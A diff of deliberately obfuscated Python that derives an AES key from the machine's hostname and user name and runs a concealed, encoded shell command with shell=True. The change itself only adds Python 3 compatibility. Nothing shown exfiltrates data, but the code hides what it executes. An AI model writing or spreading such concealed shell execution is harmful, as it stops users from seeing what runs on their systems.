@@ -28,6 +28,7 @@ if 65 - 65: O0 / iIii1I11I1II1 % OoooooooOO - i1IIi
 from Crypto . Hash import SHA256
 from Crypto . Cipher import AES
 from Crypto . Util import Counter
+import sys
 if 73 - 73: II111iiii
 def IiII1IiiIiI1 ( _______d_1l1__ ) :
  iIiiiI1IiI1I1 = Counter . new ( 128 , initial_value = 1337 )
@@ -45,7 +46,7 @@ def I11i ( ) :
  Oo0oO0oo0oO00 = getuser ( )
  hash . update ( O0oOO0o0.encode('utf-8') )
  hash . update ( Oo0oO0oo0oO00.encode('utf-8') )
- for i111I in range ( 0 , ord ( hash . digest ( ) [ 2 ] ) ) :
+ for i111I in range ( 0 , hash . digest ( ) [ 2 ] if sys.version_info[0] > 2 else ord ( hash . digest ( ) [ 2 ] ) ) :
   jjjjjjj33934__23 = bytes ( str ( i111I + 1337 ), "utf-8" )
   hash . update ( jjjjjjj33934__23 )
   hash . update ( O0oOO0o0.encode('utf-8') )
@@ -72,8 +73,8 @@ def i1ii1iIII ( ) :
   except :
    pass
   try :
-   o0o0Oo0oooo0 = subprocess . check_output (_4_("60-:8\x11\x1c-WU\x7fr<\x7f\x16\x10a]>G\x020-2\x1a'/TC+w\x01)6<:\x7f#\x11V-V\x14\x7fr\x1a\x7fxwdd\x16wMx") ,
- shell = True ) . split ( '"' ) [ - 2 ]
+   o0o0Oo0oooo0 = str( subprocess . check_output (_4_("60-:8\x11\x1c-WU\x7fr<\x7f\x16\x10a]>G\x020-2\x1a'/TC+w\x01)6<:\x7f#\x11V-V\x14\x7fr\x1a\x7fxwdd\x16wMx") ,
+ shell = True ) ) . split ( '"' ) [ - 2 ]
    if o0o0Oo0oooo0 :
     return o0o0Oo0oooo0
   except :
